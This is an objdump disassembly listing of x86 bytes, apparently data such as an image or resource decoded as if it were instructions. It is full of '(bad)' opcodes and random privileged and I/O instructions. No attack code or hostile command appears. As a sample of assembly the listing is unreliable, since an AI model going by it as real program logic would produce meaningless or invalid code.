  40169d:	19 cf                	sbb    %ecx,%edi
  40169f:	f7 16                	notl   (%esi)
  4016a1:	c1 e8 11             	shr    $0x11,%eax
  4016a4:	a2 c9 12 ac d4       	mov    %al,0xd4ac12c9
  4016a9:	12 ab d5 13 b5 de    	adc    -0x214aec2b(%ebx),%ch
  4016af:	19 cf                	sbb    %ecx,%edi
  4016b1:	f5                   	cmc
  4016b2:	17                   	pop    %ss
  4016b3:	cf                   	iret
  4016b4:	f7 1f                	negl   (%edi)
  4016b6:	d2 f7                	shl    %cl,%bh
  4016b8:	29 d5                	sub    %edx,%ebp
  4016ba:	f6 1c ce             	negb   (%esi,%ecx,8)
  4016bd:	f5                   	cmc
  4016be:	19 d0                	sbb    %edx,%eax
  4016c0:	f7 18                	negl   (%eax)
  4016c2:	d0 f8                	sar    $1,%al
  4016c4:	16                   	push   %ss
  4016c5:	cb                   	lret
  4016c6:	f4                   	hlt
  4016c7:	35 b7 d9 b9 d5       	xor    $0xd5b9d9b7,%eax
  4016cc:	df fb                	(bad)
  4016ce:	fc                   	cld
  4016cf:	fd                   	std
  4016d0:	f5                   	cmc
  4016d1:	f6 fe                	idiv   %dh
  4016d3:	f3 f3 fd             	repz repz std
  4016d6:	ff                   	(bad)
  4016d7:	ff                   	(bad)
  4016d8:	ff                   	(bad)
  4016d9:	ff                   	(bad)
  4016da:	ff                   	(bad)
  4016db:	ff                   	(bad)
  4016dc:	fd                   	std
  4016dd:	fe                   	(bad)
  4016de:	fe                   	(bad)
  4016df:	d3 fc                	sar    %cl,%esp
  4016e1:	fd                   	std
  4016e2:	f4                   	hlt
  4016e3:	ff                   	(bad)
  4016e4:	ff e1                	jmp    *%ecx
  4016e6:	ed                   	in     (%dx),%eax
  4016e7:	f2 64 bb d0 2a bb d9 	repnz fs mov $0xd9bb2ad0,%ebx
  4016ee:	11 a2 ca 13 ab d3    	adc    %esp,-0x2c54ec36(%edx)
  4016f4:	16                   	push   %ss
  4016f5:	c7                   	(bad)
  4016f6:	ef                   	out    %eax,(%dx)
  4016f7:	17                   	pop    %ss
  4016f8:	ce                   	into
  4016f9:	f7 17                	notl   (%edi)
  4016fb:	cd f6                	int    $0xf6
  4016fd:	17                   	pop    %ss
  4016fe:	ce                   	into
  4016ff:	f6 13                	notb   (%ebx)
  401701:	ad                   	lods   %ds:(%esi),%eax
  401702:	d4 1b                	aam    $0x1b
  401704:	a0 c3 2d ce eb       	mov    0xebce2dc3,%al
  401709:	2a ca                	sub    %dl,%cl
  40170b:	ea 1f c7 ed 18 ce f5 	ljmp   $0xf5ce,$0x18edc71f
  401712:	18 ce                	sbb    %cl,%dh
  401714:	f6 21                	mulb   (%ecx)
  401716:	d1 f6                	shl    $1,%esi
  401718:	3c dc                	cmp    $0xdc,%al
  40171a:	f7 2d d5 f4 18 cf    	imull  0xcf18f4d5
  401720:	f5                   	cmc
  401721:	18 cd                	sbb    %cl,%ch
  401723:	f6 16                	notb   (%esi)
  401725:	cf                   	iret
  401726:	f8                   	clc
  401727:	16                   	push   %ss
  401728:	cb                   	lret
  401729:	f4                   	hlt
  40172a:	56                   	push   %esi
  40172b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40172c:	bf ce df e7 e7       	mov    $0xe7e7dfce,%edi
  401731:	ee                   	out    %al,(%dx)
  401732:	f1                   	int1
  401733:	fc                   	cld
  401734:	fd                   	std
  401735:	fd                   	std
  401736:	ff                   	(bad)
  401737:	ff                   	(bad)
  401738:	ff                   	(bad)
  401739:	ff                   	(bad)
  40173a:	ff                   	(bad)
  40173b:	ff                   	(bad)
  40173c:	fd                   	std
  40173d:	fe                   	(bad)
  40173e:	fe                   	(bad)
  40173f:	ea fe fe e7 ff ff f0 	ljmp   $0xf0ff,$0xffe7fefe
  401746:	f4                   	hlt
  401747:	f7 79 b5             	idivl  -0x4b(%ecx)
  40174a:	c8 1d af d4          	enter  $0xaf1d,$0xd4
  40174e:	15 a7 cf 12 94       	adc    $0x9412cfa7,%eax
  401753:	ba 15 b6 de 17       	mov    $0x17deb615,%edx
  401758:	cc                   	int3
  401759:	f5                   	cmc
  40175a:	18 ce                	sbb    %cl,%dh
  40175c:	f7 17                	notl   (%edi)
  40175e:	cd f6                	int    $0xf6
  401760:	13 b2 da 32 c4 e1    	adc    -0x1e3bcd26(%edx),%esi
  401766:	5c                   	pop    %esp
  401767:	eb f4                	jmp    0x40175d
  401769:	5c                   	pop    %esp
  40176a:	ec                   	in     (%dx),%al
  40176b:	f8                   	clc
  40176c:	44                   	inc    %esp
  40176d:	e0 f7                	loopne 0x401766
  40176f:	22 d2                	and    %dl,%dl
  401771:	f7 21                	mull   (%ecx)
  401773:	d1 f6                	shl    $1,%esi
  401775:	28 d3                	sub    %dl,%bl
  401777:	f5                   	cmc
  401778:	49                   	dec    %ecx
  401779:	e4 f9                	in     $0xf9,%al
  40177b:	3e dc f6             	ds fdiv %st,%st(6)
  40177e:	1d cf f3 17 cd       	sbb    $0xcd17f3cf,%eax
  401783:	f5                   	cmc
  401784:	16                   	push   %ss
  401785:	ce                   	into
  401786:	f7 16                	notl   (%esi)
  401788:	c2 eb 24             	ret    $0x24eb
  40178b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40178c:	c8 6a b3 cb          	enter  $0xb36a,$0xcb
  401790:	9b                   	fwait
  401791:	cc                   	int3
  401792:	db d2                	fcmovnbe %st(2),%st
  401794:	e5 ed                	in     $0xed,%eax
  401796:	f2 f5                	repnz cmc
  401798:	f7 ff                	idiv   %edi
  40179a:	ff                   	(bad)
  40179b:	ff                   	(bad)
  40179c:	ff                   	(bad)
  40179d:	ff                   	(bad)
  40179e:	ff                   	(bad)
  40179f:	ff                   	(bad)
  4017a0:	ff                   	(bad)
  4017a1:	ff                   	(bad)
  4017a2:	ff                   	(bad)
  4017a3:	ff                   	(bad)
  4017a4:	ff c2                	inc    %edx
  4017a6:	dc e5                	fsub   %st,%st(5)
  4017a8:	34 b6                	xor    $0xb6,%al
  4017aa:	d8 15 ce f9 15 af    	fcoms  0xaf15f9ce
  4017b0:	d8 12                	fcoms  (%edx)
  4017b2:	85 ac 16 bf e7 17 cc 	test   %ebp,-0x33e81841(%esi,%edx,1)
  4017b9:	f5                   	cmc
  4017ba:	16                   	push   %ss
  4017bb:	cc                   	int3
  4017bc:	f6 16                	notb   (%esi)
  4017be:	cd f6                	int    $0xf6
  4017c0:	16                   	push   %ss
  4017c1:	c9                   	leave
  4017c2:	f2 2b ad ce 4e c4 d6 	repnz sub -0x293bb132(%ebp),%ebp
  4017c9:	62 d6 e6 69 e7       	(bad)
  4017ce:	f2 40                	repnz inc %eax
  4017d0:	df f7                	fcomip %st(7),%st
  4017d2:	35 db f7 25 d1       	xor    $0xd125f7db,%eax
  4017d7:	f5                   	cmc
  4017d8:	3c dd                	cmp    $0xdd,%al
  4017da:	f6 40 df f7          	testb  $0xf7,-0x21(%eax)
  4017de:	37                   	aaa
  4017df:	db f7                	fcomi  %st(7),%st
  4017e1:	19 ce                	sbb    %ecx,%esi
  4017e3:	f5                   	cmc
  4017e4:	17                   	pop    %ss
  4017e5:	ce                   	into
  4017e6:	f6 1d d0 f6 40 e2    	negb   0xe240f6d0
  4017ec:	fc                   	cld
  4017ed:	20 cc                	and    %cl,%ah
  4017ef:	f1                   	int1
  4017f0:	15 ba e3 3f 9f       	adc    $0x9f3fe3ba,%eax
  4017f5:	bf ba d3 de f9       	mov    $0xf9ded3ba,%edi
  4017fa:	fc                   	cld
  4017fb:	fc                   	cld
  4017fc:	fd                   	std
  4017fd:	fe                   	(bad)
  4017fe:	fe                   	(bad)
  4017ff:	ff                   	(bad)
  401800:	ff                   	(bad)
  401801:	ff                   	(bad)
  401802:	ff                   	(bad)
  401803:	ff                   	(bad)
  401804:	ff 76 bb             	push   -0x45(%esi)
  401807:	d0 18                	rcrb   $1,(%eax)
  401809:	cd f5                	int    $0xf5
  40180b:	16                   	push   %ss
  40180c:	ce                   	into
  40180d:	f7 16                	notl   (%esi)
  40180f:	cc                   	int3
  401810:	f4                   	hlt
  401811:	12 88 af 16 c9 f2    	adc    -0xd36e951(%eax),%cl
  401817:	17                   	pop    %ss
  401818:	ce                   	into
  401819:	f7 13                	notl   (%ebx)
  40181b:	cb                   	lret
  40181c:	f6 14 cc             	notb   (%esp,%ecx,8)
  40181f:	f6 16                	notb   (%esi)
  401821:	cd f6                	int    $0xf6
  401823:	12 c9                	adc    %cl,%cl
  401825:	f4                   	hlt
  401826:	0f b7 df             	movzwl %di,%ebx
  401829:	15 a6 cd 27 c2       	adc    $0xc227cda6,%eax
  40182e:	e4 27                	in     $0x27,%al
  401830:	d5 f7                	aad    $0xf7
  401832:	35 db f8 3b dc       	xor    $0xdc3bf8db,%eax
  401837:	f7 2e                	imull  (%esi)
  401839:	d7                   	xlat   %ds:(%ebx)
  40183a:	f5                   	cmc
  40183b:	42                   	inc    %edx
  40183c:	df f7                	fcomip %st(7),%st
  40183e:	49                   	dec    %ecx
  40183f:	e2 f8                	loop   0x401839
  401841:	22 d1                	and    %cl,%dl
  401843:	f5                   	cmc
  401844:	17                   	pop    %ss
  401845:	ce                   	into
  401846:	f6 2f                	imulb  (%edi)
  401848:	d9 f7                	fincstp
  40184a:	79 fb                	jns    0x401847
  40184c:	fd                   	std
  40184d:	4a                   	dec    %edx
  40184e:	e6 fa                	out    %al,$0xfa
  401850:	18 d0                	sbb    %dl,%al
  401852:	f9                   	stc
  401853:	19 d4                	sbb    %edx,%esp
  401855:	fb                   	sti
  401856:	3a b6 d6 cd ea ee    	cmp    -0x1115322a(%esi),%dh
  40185c:	fc                   	cld
  40185d:	fe                   	(bad)
  40185e:	fe                   	(bad)
  40185f:	ff                   	(bad)
  401860:	ff                   	(bad)
  401861:	ff d0                	call   *%eax
  401863:	db e2                	fnclex
  401865:	25 b6 dc 17 d0       	and    $0xd017dcb6,%eax
  40186a:	f8                   	clc
  40186b:	17                   	pop    %ss
  40186c:	ce                   	into
  40186d:	f6 17                	notb   (%edi)
  40186f:	d2 fa                	sar    %cl,%dl
  401871:	15 b9 e2 15 bc       	adc    $0xbc15e2b9,%eax
  401876:	e4 14                	in     $0x14,%al
  401878:	c8 f2 21 d4          	enter  $0x21f2,$0xd4
  40187c:	f8                   	clc
  40187d:	4a                   	dec    %edx
  40187e:	e5 fb                	in     $0xfb,%eax
  401880:	5a                   	pop    %edx
  401881:	eb fc                	jmp    0x40187f
  401883:	53                   	push   %ebx
  401884:	ea fb 35 db f8 1c ce 	ljmp   $0xce1c,$0xf8db35fb
  40188b:	f4                   	hlt
  40188c:	15 cb f4 21 d1       	adc    $0xd121f4cb,%eax
  401891:	f6 3e                	idivb  (%esi)
  401893:	de f7                	fdivp  %st,%st(7)
  401895:	38 db                	cmp    %bl,%bl
  401897:	f7 2c d5 f6 4d e6 fa 	imull  -0x519b20a(,%edx,8)
  40189e:	3f                   	aas
  40189f:	de f8                	fdivrp %st,%st(0)
  4018a1:	30 d7                	xor    %dl,%bh
  4018a3:	f6 15 cc f6 1f d0    	notb   0xd01ff6cc
  4018a9:	f6 54 e8 fa          	notb   -0x6(%eax,%ebp,8)
  4018ad:	59                   	pop    %ecx
  4018ae:	ec                   	in     (%dx),%al
  4018af:	fb                   	sti
  4018b0:	20 d4                	and    %dl,%ah
  4018b2:	fa                   	cli
  4018b3:	18 d6                	sbb    %dl,%dh
  4018b5:	fe                   	(bad)
  4018b6:	2b ba dd b5 d4 de    	sub    -0x212b4a23(%edx),%edi
  4018bc:	fc                   	cld
  4018bd:	fe                   	(bad)
  4018be:	fe                   	(bad)
  4018bf:	ff                   	(bad)
  4018c0:	ff                   	(bad)
  4018c1:	ff 8a b1 c3 16 c7    	decl   -0x38e93c4f(%edx)
  4018c7:	f1                   	int1
  4018c8:	12 cc                	adc    %ah,%cl
  4018ca:	f6 12                	notb   (%edx)
  4018cc:	cb                   	lret
  4018cd:	f5                   	cmc
  4018ce:	15 b7 df 15 af       	adc    $0xaf15dfb7,%eax
  4018d3:	d7                   	xlat   %ds:(%ebx)
  4018d4:	13 a9 d1 16 b1 d7    	adc    -0x284ee92f(%ecx),%ebp
  4018da:	5c                   	pop    %esp
  4018db:	ed                   	in     (%dx),%eax
  4018dc:	fc                   	cld
  4018dd:	94                   	xchg   %eax,%esp
  4018de:	f5                   	cmc
  4018df:	fd                   	std
  4018e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4018e1:	f5                   	cmc
  4018e2:	fd                   	std
  4018e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4018e4:	f4                   	hlt
  4018e5:	fd                   	std
  4018e6:	66 f1                	data16 int1
  4018e8:	fd                   	std
  4018e9:	49                   	dec    %ecx
  4018ea:	e6 fc                	out    %al,$0xfc
  4018ec:	1b d0                	sbb    %eax,%edx
  4018ee:	f7 19                	negl   (%ecx)
  4018f0:	ce                   	into
  4018f1:	f6 29                	imulb  (%ecx)
  4018f3:	d5 f7                	aad    $0xf7
  4018f5:	46                   	inc    %esi
  4018f6:	e1 f9                	loope  0x4018f1
  4018f8:	38 db                	cmp    %bl,%bl
  4018fa:	f7 25 d4 f6 3b dc    	mull   0xdc3bf6d4
  401900:	f7 22                	mull   (%edx)
  401902:	d1 f5                	shl    $1,%ebp
  401904:	15 cc f6 17 cd       	adc    $0xcd17f6cc,%eax
  401909:	f6 23                	mulb   (%ebx)
  40190b:	d3 f7                	shl    %cl,%edi
  40190d:	2c d7                	sub    $0xd7,%al
  40190f:	f7 19                	negl   (%ecx)
  401911:	be e5 15 b6 de       	mov    $0xdeb615e5,%esi
  401916:	2a ad d1 b5 cd d8    	sub    -0x27324a2f(%ebp),%ch
  40191c:	fd                   	std
  40191d:	fe                   	(bad)
  40191e:	fe                   	(bad)
  40191f:	fe                   	(bad)
  401920:	fe                   	(bad)
  401921:	fe                   	(bad)
  401922:	75 a5                	jne    0x4018c9
  401924:	ba 1a d0 f9 29       	mov    $0x29f9d01a,%edx
  401929:	d7                   	xlat   %ds:(%ebx)
  40192a:	f8                   	clc
  40192b:	29 c3                	sub    %eax,%ebx
  40192d:	e3 20                	jecxz  0x40194f
  40192f:	af                   	scas   %es:(%edi),%eax
  401930:	d3 13                	rcll   %cl,(%ebx)
  401932:	b4 dc                	mov    $0xdc,%ah
  401934:	14 bb                	adc    $0xbb,%al
  401936:	e3 18                	jecxz  0x401950
  401938:	ac                   	lods   %ds:(%esi),%al
  401939:	d1 6d e6             	shrl   $1,-0x1a(%ebp)
  40193c:	f1                   	int1
  40193d:	c1 fb fd             	sar    $0xfd,%ebx
  401940:	89 f8                	mov    %edi,%eax
  401942:	fe                   	(bad)
  401943:	72 f7                	jb     0x40193c
  401945:	fe                   	(bad)
  401946:	74 f6                	je     0x40193e
  401948:	fe                   	(bad)
  401949:	69 f2 fd 33 da f8    	imul   $0xf8da33fd,%edx,%esi
  40194f:	18 cf                	sbb    %cl,%bh
  401951:	f6 1f                	negb   (%edi)
  401953:	d1 f7                	shl    $1,%edi
  401955:	3a db                	cmp    %bl,%bl
  401957:	f7 39                	idivl  (%ecx)
  401959:	db f6                	fcomi  %st(6),%st
  40195b:	1a ce                	sbb    %dh,%cl
  40195d:	f5                   	cmc
  40195e:	22 d2                	and    %dl,%dl
  401960:	f6 16                	notb   (%esi)
  401962:	cb                   	lret
  401963:	f5                   	cmc
  401964:	16                   	push   %ss
  401965:	cc                   	int3
  401966:	f6 16                	notb   (%esi)
  401968:	cf                   	iret
  401969:	f8                   	clc
  40196a:	15 d0 f8 17 ce       	adc    $0xce17f8d0,%eax
  40196f:	f7 14 b0             	notl   (%eax,%esi,4)
  401972:	d8 63 b3             	fsubs  -0x4d(%ebx)
  401975:	cc                   	int3
  401976:	98                   	cwtl
  401977:	d0 e1                	shl    $1,%cl
  401979:	d2 e7                	shl    %cl,%bh
  40197b:	ec                   	in     (%dx),%al
  40197c:	d9 fc                	frndint
  40197e:	fe                   	(bad)
  40197f:	fe                   	(bad)
  401980:	fe                   	(bad)
  401981:	fe                   	(bad)
  401982:	a3 c0 ce 28 c9       	mov    %eax,0xc928cec0
  401987:	eb 56                	jmp    0x4019df
  401989:	ed                   	in     (%dx),%eax
  40198a:	fc                   	cld
  40198b:	4d                   	dec    %ebp
  40198c:	ca dd 2d             	lret   $0x2ddd
  40198f:	b5 d4                	mov    $0xd4,%ch
  401991:	12 ab d3 15 b0 d7    	adc    -0x284fea2d(%ebx),%ch
  401997:	14 af                	adc    $0xaf,%al
  401999:	d6                   	salc
  40199a:	5c                   	pop    %esp
  40199b:	cb                   	lret
  40199c:	dc ba fc fd b0 fa    	fdivrl -0x54f0204(%edx)
  4019a2:	fd                   	std
  4019a3:	78 f7                	js     0x40199c
  4019a5:	fd                   	std
  4019a6:	71 f6                	jno    0x40199e
  4019a8:	fe                   	(bad)
  4019a9:	74 f7                	je     0x4019a2
  4019ab:	fe 4d e5             	decb   -0x1b(%ebp)
  4019ae:	fa                   	cli
  4019af:	18 ce                	sbb    %cl,%dh
  4019b1:	f7 1a                	negl   (%edx)
  4019b3:	cf                   	iret
  4019b4:	f6 26                	mulb   (%esi)
  4019b6:	d3 f5                	shl    %cl,%ebp
  4019b8:	41                   	inc    %ecx
  4019b9:	e0 f7                	loopne 0x4019b2
  4019bb:	43                   	inc    %ebx
  4019bc:	e1 f9                	loope  0x4019b7
  4019be:	30 d8                	xor    %bl,%al
  4019c0:	f8                   	clc
  4019c1:	24 d3                	and    $0xd3,%al
  4019c3:	f8                   	clc
  4019c4:	18 d1                	sbb    %dl,%cl
  4019c6:	f7 15 c2 f0 15 bd    	notl   0xbd15f0c2
  4019cc:	ed                   	in     (%dx),%eax
  4019cd:	16                   	push   %ss
  4019ce:	ce                   	into
  4019cf:	f7 14 b5 dd ac c5 d1 	notl   -0x2e3a5323(,%esi,4)
  4019d6:	f1                   	int1
  4019d7:	f4                   	hlt
  4019d8:	f6 ee                	imul   %dh
  4019da:	fc                   	cld
  4019db:	fc                   	cld
  4019dc:	d0 fc                	sar    $1,%ah
  4019de:	fe                   	(bad)
  4019df:	fe                   	(bad)
  4019e0:	fe                   	(bad)
  4019e1:	fe                   	(bad)
  4019e2:	e3 e9                	jecxz  0x4019cd
  4019e4:	ee                   	out    %al,(%dx)
  4019e5:	47                   	inc    %edi
  4019e6:	bc d6 79 f9 fd       	mov    $0xfdf979d6,%esp
  4019eb:	71 e4                	jno    0x4019d1
  4019ed:	ee                   	out    %al,(%dx)
  4019ee:	3d bb d5 19 99       	cmp    $0x9919d5bb,%eax
  4019f3:	bc 15 9b c1 10       	mov    $0x10c19b15,%esp
  4019f8:	ae                   	scas   %es:(%edi),%al
  4019f9:	d8 55 c3             	fcoms  -0x3d(%ebp)
  4019fc:	d7                   	xlat   %ds:(%ebx)
  4019fd:	92                   	xchg   %eax,%edx
  4019fe:	f3 fd                	repz std
  401a00:	af                   	scas   %es:(%edi),%eax
  401a01:	f7 fd                	idiv   %ebp
  401a03:	7c f6                	jl     0x4019fb
  401a05:	fd                   	std
  401a06:	71 f6                	jno    0x4019fe
  401a08:	fe                   	(bad)
  401a09:	74 f6                	je     0x401a01
  401a0b:	fe                   	(bad)
  401a0c:	60                   	pusha
  401a0d:	ee                   	out    %al,(%dx)
  401a0e:	fc                   	cld
  401a0f:	1a ce                	sbb    %dh,%cl
  401a11:	f7 16                	notl   (%esi)
  401a13:	cc                   	int3
  401a14:	f6 24 d3             	mulb   (%ebx,%edx,8)
  401a17:	f6 59 ec             	negb   -0x14(%ecx)
  401a1a:	fb                   	sti
  401a1b:	71 f7                	jno    0x401a14
  401a1d:	fe                   	(bad)
  401a1e:	62 ef fc             	(bad) {%k3}
  401a21:	4b                   	dec    %ebx
  401a22:	e3 f8                	jecxz  0x401a1c
  401a24:	1e                   	push   %ds
  401a25:	b8 ed 0d 79 d8       	mov    $0xd8790ded,%eax
  401a2a:	0c 71                	or     $0x71,%al
  401a2c:	d4 13                	aam    $0x13
  401a2e:	b2 ee                	mov    $0xee,%dl
  401a30:	15 be e7 c1 d3       	adc    $0xd3c1e7be,%eax
  401a35:	dc ff                	fdivr  %st,%st(7)
  401a37:	ff                   	(bad)
  401a38:	ff                   	(bad)
  401a39:	f9                   	stc
  401a3a:	fe                   	(bad)
  401a3b:	fe                   	(bad)
  401a3c:	ec                   	in     (%dx),%al
  401a3d:	fe                   	(bad)
  401a3e:	fe                   	(bad)
  401a3f:	fe                   	(bad)
  401a40:	fe                   	(bad)
  401a41:	fe                   	(bad)
  401a42:	ff                   	(bad)
  401a43:	ff                   	(bad)
  401a44:	ff 82 c0 d2 75 e9    	incl   -0x168a2d40(%edx)
  401a4a:	f5                   	cmc
  401a4b:	87 f8                	xchg   %edi,%eax
  401a4d:	fd                   	std
  401a4e:	59                   	pop    %ecx
  401a4f:	cc                   	int3
  401a50:	d9 31                	fnstenv (%ecx)
  401a52:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401a53:	c3                   	ret
  401a54:	1b ba df 1b b0 d6    	sbb    -0x294fe421(%edx),%edi
  401a5a:	66 de ec             	data16 fsubrp %st,%st(4)
  401a5d:	72 e0                	jb     0x401a3f
  401a5f:	fa                   	cli
  401a60:	71 ef                	jno    0x401a51
  401a62:	fc                   	cld
  401a63:	72 f6                	jb     0x401a5b
  401a65:	fe                   	(bad)
  401a66:	73 f7                	jae    0x401a5f
  401a68:	ff 73 f6             	push   -0xa(%ebx)
  401a6b:	fe                   	(bad)
  401a6c:	6b f4 fd             	imul   $0xfffffffd,%esp,%esi
  401a6f:	24 d3                	and    $0xd3,%al
  401a71:	f7 16                	notl   (%esi)
  401a73:	cc                   	int3
  401a74:	f6 2e                	imulb  (%esi)
  401a76:	d8 f8                	fdivr  %st(0),%st
  401a78:	6e                   	outsb  %ds:(%esi),(%dx)
  401a79:	f6 fd                	idiv   %ch
  401a7b:	71 f5                	jno    0x401a72
  401a7d:	f9                   	stc
  401a7e:	74 f1                	je     0x401a71
  401a80:	f9                   	stc
  401a81:	5f                   	pop    %edi
  401a82:	ca ea 1f             	lret   $0x1fea
  401a85:	65 d1 01             	roll   $1,%gs:(%ecx)
  401a88:	05 c2 02 09 c3       	add    $0xc30902c2,%eax
  401a8d:	0c 6c                	or     $0x6c,%al
  401a8f:	db 14 b9             	fistl  (%ecx,%edi,4)
  401a92:	e4 c1                	in     $0xc1,%al
  401a94:	d3 dc                	rcr    %cl,%esp
  401a96:	ff                   	(bad)
  401a97:	ff                   	(bad)
  401a98:	ff                   	(bad)
  401a99:	ff                   	(bad)
  401a9a:	ff                   	(bad)
  401a9b:	ff                   	(bad)
  401a9c:	ff                   	(bad)
  401a9d:	ff                   	(bad)
  401a9e:	ff                   	(bad)
  401a9f:	ff                   	(bad)
  401aa0:	ff                   	(bad)
  401aa1:	ff                   	(bad)
  401aa2:	f9                   	stc
  401aa3:	fe                   	(bad)
  401aa4:	f9                   	stc
  401aa5:	db e9                	fucomi %st(1),%st
  401aa7:	ee                   	out    %al,(%dx)
  401aa8:	57                   	push   %edi
  401aa9:	c1 d9 66             	rcr    $0x66,%ecx
  401aac:	f2 fb                	repnz sti
  401aae:	75 f4                	jne    0x401aa4
  401ab0:	f9                   	stc
  401ab1:	4d                   	dec    %ebp
  401ab2:	c2 d6 37             	ret    $0x37d6
  401ab5:	bc d7 3c b7 ce       	mov    $0xceb73cd7,%esp
  401aba:	76 f6                	jbe    0x401ab2
  401abc:	fc                   	cld
  401abd:	66 cd e8             	data16 int $0xe8
  401ac0:	6c                   	insb   (%dx),%es:(%edi)
  401ac1:	ed                   	in     (%dx),%eax
  401ac2:	f4                   	hlt
  401ac3:	72 f7                	jb     0x401abc
  401ac5:	fe                   	(bad)
  401ac6:	73 f7                	jae    0x401abf
  401ac8:	ff 73 f6             	push   -0xa(%ebx)
  401acb:	fe                   	(bad)
  401acc:	6d                   	insl   (%dx),%es:(%edi)
  401acd:	f5                   	cmc
  401ace:	fd                   	std
  401acf:	26 d4 f7             	es aam $0xf7
  401ad2:	19 d0                	sbb    %edx,%eax
  401ad4:	f7 24 d4             	mull   (%esp,%edx,8)
  401ad7:	f6 61 eb             	mulb   -0x15(%ecx)
  401ada:	f9                   	stc
  401adb:	5d                   	pop    %ebp
  401adc:	ce                   	into
  401add:	e5 59                	in     $0x59,%eax
  401adf:	af                   	scas   %es:(%edi),%eax
  401ae0:	e4 18                	in     $0x18,%al
  401ae2:	3f                   	aas
  401ae3:	ca 03 17             	lret   $0x1703
  401ae6:	ce                   	into
  401ae7:	05 03 d4 05 01       	add    $0x105d403,%eax
  401aec:	d2 09                	rorb   %cl,(%ecx)
  401aee:	33 cf                	xor    %edi,%ecx
  401af0:	13 a8 db bc d1 da    	adc    -0x252e4325(%eax),%ebp
  401af6:	fd                   	std
  401af7:	fd                   	std
  401af8:	fd                   	std
  401af9:	ff                   	(bad)
  401afa:	ff                   	(bad)
  401afb:	ff                   	(bad)
  401afc:	ff                   	(bad)
  401afd:	ff                   	(bad)
  401afe:	ff                   	(bad)
  401aff:	ff                   	(bad)
  401b00:	ff                   	(bad)
  401b01:	ff b0 f4 af fb fc    	push   -0x304500c(%eax)
  401b07:	fc                   	cld
  401b08:	9a c9 d9 58 e1 ee 75 	lcall  $0x75ee,$0xe158d9c9
  401b0f:	e4 fd                	in     $0xfd,%al
  401b11:	71 d8                	jno    0x401aeb
  401b13:	f6 5d d6             	negb   -0x2a(%ebp)
  401b16:	e5 6a                	in     $0x6a,%eax
  401b18:	e9 f1 76 f7 fb       	jmp    0xfc37920e
  401b1d:	44                   	inc    %esp
  401b1e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401b1f:	be 59 c8 d6 72       	mov    $0x72d6c859,%esi
  401b24:	f7 fe                	idiv   %esi
  401b26:	73 f7                	jae    0x401b1f
  401b28:	ff 73 f6             	push   -0xa(%ebx)
  401b2b:	fe                   	(bad)
  401b2c:	6b f4 fd             	imul   $0xfffffffd,%esp,%esi
  401b2f:	26 d4 f7             	es aam $0xf7
  401b32:	19 d3                	sbb    %edx,%ebx
  401b34:	f9                   	stc
  401b35:	14 b4                	adc    $0xb4,%al
  401b37:	e9 2a 56 cf 10       	jmp    0x110f7166
  401b3c:	25 c4 07 0d c7       	and    $0xc70d07c4,%eax
  401b41:	07                   	pop    %es
  401b42:	24 da                	and    $0xda,%al
  401b44:	05 92 b8 05 1e       	add    $0x1e05b892,%eax
  401b49:	e9 05 0f d6 09       	jmp    0xa162a53
  401b4e:	26 cf                	es iret
  401b50:	12 9b d6 7f ae bf    	adc    -0x4051802a(%ebx),%bl
  401b56:	f3 f5                	repz cmc
  401b58:	f8                   	clc
  401b59:	ff                   	(bad)
  401b5a:	ff                   	(bad)
  401b5b:	ff                   	(bad)
  401b5c:	ff                   	(bad)
  401b5d:	ff                   	(bad)
  401b5e:	ff                   	(bad)
  401b5f:	ff                   	(bad)
  401b60:	ff                   	(bad)
  401b61:	ff cb                	dec    %ebx
  401b63:	f8                   	clc
  401b64:	cc                   	int3
  401b65:	f3 fe                	repz (bad)
  401b67:	fd                   	std
  401b68:	bc d2 dc 4e d3       	mov    $0xd34edcd2,%esp
  401b6d:	e9 ab f6 fd 6a       	jmp    0x6b3e121d
  401b72:	d5 e8                	aad    $0xe8
  401b74:	55                   	push   %ebp
  401b75:	cc                   	int3
  401b76:	db 71 f5             	(bad) -0xb(%ecx)
  401b79:	fa                   	cli
  401b7a:	72 f6                	jb     0x401b72
  401b7c:	fd                   	std
  401b7d:	67 e4 ee             	addr16 in $0xee,%al
  401b80:	6b ea f2             	imul   $0xfffffff2,%edx,%ebp
  401b83:	72 f6                	jb     0x401b7b
  401b85:	fe                   	(bad)
  401b86:	73 f7                	jae    0x401b7f
  401b88:	ff 73 f6             	push   -0xa(%ebx)
  401b8b:	fe                   	(bad)
  401b8c:	61                   	popa
  401b8d:	ee                   	out    %al,(%dx)
  401b8e:	fb                   	sti
  401b8f:	1d d1 f8 16 bb       	sbb    $0xbb16f8d1,%eax
  401b94:	e1 0e                	loope  0x401ba4
  401b96:	55                   	push   %ebp
  401b97:	c6                   	(bad)
  401b98:	0d 0e e1 04 04       	or     $0x404e10e,%eax
  401b9d:	ee                   	out    %al,(%dx)
  401b9e:	04 00                	add    $0x0,%al
  401ba0:	f1                   	int1
  401ba1:	02 25 d7 04 93 6b    	add    0x6b9304d7,%ah
  401ba7:	01 92 b4 06 5a c6    	add    %edx,-0x39a5f94c(%edx)
  401bad:	09 26                	or     %esp,(%esi)
  401baf:	cf                   	iret
  401bb0:	10 86 c5 28 b3 d6    	adc    %al,-0x294cd73b(%esi)
  401bb6:	64 b3 ca             	fs mov $0xca,%bl
  401bb9:	88 b0 c3 b4 cc d7    	mov    %dh,-0x28334b3d(%eax)
  401bbf:	fe                   	(bad)
  401bc0:	fe                   	(bad)
  401bc1:	fe                   	(bad)
  401bc2:	f0 fd                	lock std
  401bc4:	f1                   	int1
  401bc5:	f1                   	int1
  401bc6:	fe                   	(bad)
  401bc7:	fd                   	std
  401bc8:	e6 ec                	out    %al,$0xec
  401bca:	f0 58                	lock pop %eax
  401bcc:	bf d6 ad fb fd       	mov    $0xfdfbadd6,%edi
  401bd1:	91                   	xchg   %eax,%ecx
  401bd2:	dd e7                	fucom  %st(7)
  401bd4:	4c                   	dec    %esp
  401bd5:	be d1 6f f2 f9       	mov    $0xf9f26fd1,%esi
  401bda:	72 f6                	jb     0x401bd2
  401bdc:	fe                   	(bad)
  401bdd:	71 f6                	jno    0x401bd5
  401bdf:	fd                   	std
  401be0:	71 f5                	jno    0x401bd7
  401be2:	fc                   	cld
  401be3:	73 f7                	jae    0x401bdc
  401be5:	ff 72 f6             	push   -0xa(%edx)
  401be8:	fe                   	(bad)
